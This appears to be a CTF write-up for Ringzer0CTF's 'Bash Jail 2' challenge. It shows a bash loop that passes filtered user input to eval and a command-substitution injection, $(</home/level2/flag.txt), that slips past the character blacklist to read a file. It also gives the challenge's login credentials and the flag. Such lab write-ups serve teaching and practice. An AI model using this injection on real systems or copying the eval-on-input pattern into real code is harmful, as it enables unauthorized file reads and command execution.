---
layout: post
title: Ringzer0CTF Bash Jail 2
categories: [Write-Ups, Ringzer0CTF, Jail-Escaping]
tags: [Ringzer0CTF, Jail Escaping]
featured-image:  ringzer0CTF/icon.png
featured-image-alt: ringzer0CTF
---

It's a write-up about the challenge : [Ringzer0CTF - Bash Jail 2](https://ringzer0ctf.com/challenges/30)

# Challenge 30 - Bash Jail 2

## 1. Challenge

After login into the level2 with this command : 
`ssh -l level2 -p 10219 challenges.ringzer0team.com`
and this password : FLAG-U96l4k6m72a051GgE5EN0rA85499172K

```
RingZer0 Team Online CTF

BASH Jail Level 2:
Current user is uid=1001(level2) gid=1001(level2) groups=1001(level2)

Flag is located at /home/level2/flag.txt

Challenge bash code:
-----------------------------

function check_space {
	if [[ $1 == *[bdks';''&'' ']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output="echo Your command is: $input"
		eval $output
	fi
done 

-----------------------------
Your input:
```

## 2. Solution

Some characters like ";" "&" "]" "b", "d" are not allowed because of the test with the function check_space.
This is why, we tried this : `$(</home/level2/flag.txt)` to read the flag.
The result was :
```
Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P
```

To avoid the space, we can use the command substitution `<`.
So, we will have the same result with this command :
`$(cat<flag.txt)` or this one `$(<flag.txt)`

We can use ``` ` ``` instead of `$` also.

The flag is : **FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P**